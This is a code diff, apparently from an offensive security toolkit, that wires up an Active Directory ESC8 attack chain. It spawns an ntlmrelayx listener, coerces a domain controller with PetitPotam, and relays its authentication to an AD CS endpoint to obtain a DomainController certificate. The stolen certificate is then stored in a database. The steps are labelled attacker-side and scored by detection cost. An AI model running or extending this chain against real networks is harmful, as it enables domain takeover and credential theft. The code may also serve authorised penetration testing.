@@ -306,6 +306,175 @@ def _stub_action(msg):
 
 # ---------------------------------------------------------------- coerce steps
 
+# ---------------------------------------------------------------- relay steps
+
+def _relay_listen_action(chain, ctx):
+    """Spawn the ntlmrelayx listener with the profile's relay target.
+
+    Reads from ``ctx``:
+      * ``ctx.listener_ip`` (required) — the IP the coerce target will
+        auth to. Usually the operator's Kali reachable from the
+        target subnet.
+      * ``ctx.ca_endpoint`` (esc8) — the CA host (for adcs-cert mode);
+        without it, the step reports manual since ntlmrelayx has
+        nowhere to relay the caught auth.
+      * ``ctx.template`` (optional) — ADCS template name; default
+        ``DomainController`` per the esc8 canonical.
+      * ``ctx.relay_port_smb`` / ``ctx.relay_port_http`` (optional) —
+        bind ports; defaults 445 / 80. Non-root operators want to
+        pass 4445 / 8080.
+      * ``ctx.relay_tool_bin`` (optional) — override the resolved
+        ntlmrelayx binary path (test hook).
+      * ``ctx.relay_bind_wait`` (optional) — how long to wait for a
+        bind-ok signature before giving up; default 3.0s.
+
+    On success the step registers the live :class:`~fieldkit.relay.Listener`
+    into ``ctx._relay_listener`` (private-ish attribute the
+    :func:`_relay_capture_action` step reads) AND updates
+    ``ctx.listener_uri`` so the coerce step (which ran BEFORE this in
+    the chain plan? — no, relay:listen runs before coerce for esc8;
+    see the profile step order) has a real URI to point at.
+
+    Wait — that's a note-to-future-self: the esc8 step order is
+    reachability → coerce → relay:listen → relay:capture. So the
+    coerce step in D2 needs the listener URI BEFORE relay:listen
+    runs. Solution used here: ``_petitpotam_action`` calls
+    :func:`fieldkit.relay.start` inline the first time it needs a
+    listener_uri, stashes the Listener on ctx, and the later
+    relay:listen step becomes a no-op if the listener is already
+    running. See _ensure_listener().
+    """
+    listener = _ensure_listener(chain, ctx)
+    if isinstance(listener, Outcome):
+        return listener
+    if not listener.listener_uri:
+        return Outcome(
+            kind="fail",
+            evidence=("relay listener could not bind — check --relay-port-smb "
+                      "/ --relay-port-http (default 445/80 need root)"),
+            data={"relay_bind_lines": listener.captured_lines[-10:]})
+    return Outcome(
+        kind="ok",
+        evidence=f"relay listener up at {listener.listener_uri} "
+                 f"(pid {listener.proc.pid if listener.proc else '?'})",
+        data={"relay_listener_uri": listener.listener_uri,
+              "relay_pid": listener.proc.pid if listener.proc else None})
+
+
+def _relay_capture_action(chain, ctx):
+    """Wait for the listener to catch a relay outcome (cert / cred /
+    fail / timeout), stop the listener, and — if we got a
+    certificate — persist it into Store.
+
+    Reads:
+      * ``ctx._relay_listener`` — the Listener spawned by
+        :func:`_relay_listen_action` / :func:`_ensure_listener`.
+      * ``ctx.relay_wait_capture`` (optional) — how long to wait for
+        the caught auth to arrive after the coerce fired; default
+        60s. Real coerces usually fire within seconds; a generous
+        default absorbs a slow SMB timeout.
+      * ``ctx.store`` (optional) — a fieldkit.state.Store; if set,
+        a cert-ok outcome persists a certificate row linked to the
+        chain via chain_id.
+    """
+    from . import relay as relay_mod
+    listener = getattr(ctx, "_relay_listener", None)
+    if listener is None:
+        return Outcome(
+            kind="fail",
+            evidence="no relay listener attached to ctx — did relay:listen run?")
+    timeout = getattr(ctx, "relay_wait_capture", 60.0)
+    outcome = relay_mod.wait_capture(listener, timeout=timeout)
+    listener.stop()
+
+    if outcome.kind == "cert-ok":
+        store = getattr(ctx, "store", None)
+        cert_id = None
+        chain_id = getattr(chain, "_persisted_id", None)   # set by CLI post-walk
+        if store is not None and outcome.cert_bytes:
+            cert_id = store.add_certificate(
+                principal=outcome.principal or chain.target,
+                cert_b64=outcome.cert_bytes,
+                source="relay-adcs",
+                template=listener.target.template,
+                chain_id=chain_id)
+        return Outcome(
+            kind="ok",
+            evidence=f"cert acquired for {outcome.principal or chain.target}"
+                     + (f" (cert #{cert_id})" if cert_id else ""),
+            data={"cert_id": cert_id,
+                  "cert_principal": outcome.principal,
+                  "cert_bytes": outcome.cert_bytes})
+    if outcome.kind == "cred-ok":
+        return Outcome(
+            kind="ok",
+            evidence=f"credential caught for {outcome.principal or '?'}",
+            data={"relay_principal": outcome.principal})
+    if outcome.kind == "cred-fail":
+        return Outcome(
+            kind="fail",
+            evidence="relay caught an auth but it failed (STATUS_LOGON_FAILURE / ACCESS_DENIED)",
+            data={"relay_detail": outcome.detail})
+    if outcome.kind == "timeout":
+        return Outcome(
+            kind="fail",
+            evidence=f"relay listener saw no auth in {timeout}s — coerce may have missed",
+            data={"relay_detail": outcome.detail})
+    if outcome.kind == "no-tool":
+        return Outcome(
+            kind="manual",
+            evidence="ntlmrelayx not on PATH — run listener + coerce by hand "
+                     "(install `impacket-scripts` package)")
+    return Outcome(
+        kind="fail",
+        evidence=f"relay ended in unrecognized state ({outcome.kind})",
+        data={"relay_detail": outcome.detail})
+
+
+def _ensure_listener(chain, ctx):
+    """Spawn the relay listener if it isn't already running; stash it
+    on ctx and update ctx.listener_uri. Returns the Listener on
+    success, or an Outcome on failure the caller re-raises.
+
+    Called from BOTH _petitpotam_action (needs listener_uri) and
+    _relay_listen_action (idempotent no-op if already spawned) so the
+    chain step order stays flexible.
+    """
+    from . import relay as relay_mod
+    listener = getattr(ctx, "_relay_listener", None)
+    if listener is not None and listener.running:
+        return listener
+    listener_ip = getattr(ctx, "listener_ip", None)
+    if not listener_ip:
+        return Outcome(
+            kind="manual",
+            evidence=("no listener_ip on ctx — run "
+                      "`fieldkit chain run esc8 <dc> --listener-ip <fieldkit-ip> "
+                      "--ca <ca-host>` to enable the relay listener"))
+    ca_endpoint = getattr(ctx, "ca_endpoint", None)
+    if not ca_endpoint:
+        return Outcome(
+            kind="manual",
+            evidence=("no ca_endpoint on ctx — pass --ca <ca-host> for the "
+                      "esc8 ADCS relay target"))
+    target = relay_mod.RelayTarget(
+        mode="adcs-cert",
+        target=ca_endpoint,
+        template=getattr(ctx, "template", "DomainController"))
+    listener = relay_mod.start(
+        target=target,
+        listener_ip=listener_ip,
+        port_smb=getattr(ctx, "relay_port_smb", 445),
+        port_http=getattr(ctx, "relay_port_http", 80),
+        bind_addr=getattr(ctx, "relay_bind_addr", "0.0.0.0"),
+        tool_bin=getattr(ctx, "relay_tool_bin", None),
+        bind_wait=getattr(ctx, "relay_bind_wait", 3.0))
+    ctx._relay_listener = listener       # noqa: SLF001 — ctx is per-run
+    if listener.listener_uri:
+        ctx.listener_uri = listener.listener_uri
+    return listener
+
+
 def _petitpotam_action(chain, ctx):
     """The D2 landing: fire the PetitPotam MS-EFSR coerce and map the
     :class:`~fieldkit.coerce.CoerceResult` kind to a chain Outcome.
@@ -323,12 +492,19 @@ def _petitpotam_action(chain, ctx):
     from .coerce import petitpotam
     listener_uri = getattr(ctx, "listener_uri", None)
     if not listener_uri:
-        return Outcome(
-            kind="manual",
-            evidence=("listener_uri not configured on ctx — D3's relay "
-                      "listener isn't wired in yet, run "
-                      "`fieldkit chain run esc8 <target> --listener <smb-uri>` "
-                      "when the relay slice lands"))
+        # D3: try to spawn the relay listener now — coerce runs before
+        # relay:listen in the plan, but the coerce needs a listener_uri
+        # to point at, so the primitive owns the spawn if the operator
+        # supplied enough to build one.
+        listener = _ensure_listener(chain, ctx)
+        if isinstance(listener, Outcome):
+            return listener       # manual/fail bubbling from _ensure_listener
+        listener_uri = listener.listener_uri
+        if not listener_uri:
+            return Outcome(
+                kind="fail",
+                evidence="relay listener could not bind — cannot proceed with coerce",
+                data={"relay_bind_lines": listener.captured_lines[-10:]})
     result = petitpotam.fire(
         target=chain.target,
         listener_uri=listener_uri,
@@ -387,11 +563,11 @@ def esc8_chain(target_dc, ca_endpoint=None, cred=None):
                  detection_cost=3),
             Step("relay:listen",
                  "attacker-side",
-                 _stub_action("ntlmrelayx subprocess wrap lands in D3"),
+                 _relay_listen_action,
                  detection_cost=1),
             Step("relay:capture",
                  "attacker-side",
-                 _stub_action("relay outcome parser lands in D3"),
+                 _relay_capture_action,
                  detection_cost=2),
             Step("post:cert-request",
                  "attacker-side",
